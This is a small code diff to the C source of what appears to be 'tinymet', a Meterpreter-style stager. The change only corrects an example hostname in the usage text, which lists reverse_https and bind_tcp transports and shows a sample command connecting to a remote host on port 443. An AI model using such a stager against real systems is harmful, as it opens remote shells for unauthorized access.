@@ -283,7 +283,7 @@ int main()
 		"    2: reverse_https\n"
 		"    3: bind_tcp\n"
 		"\nExample:\n"
-		"\"tinymet.exe 2 handler.com 443\"\nwill use reverse_https and connect to host.com:443\n";
+		"\"tinymet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
 		//"\"tinymet.exe 3 0.0.0.0 4444\"\nwill bind_tcp port 4444 on all interfaces.\n";
 
 	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
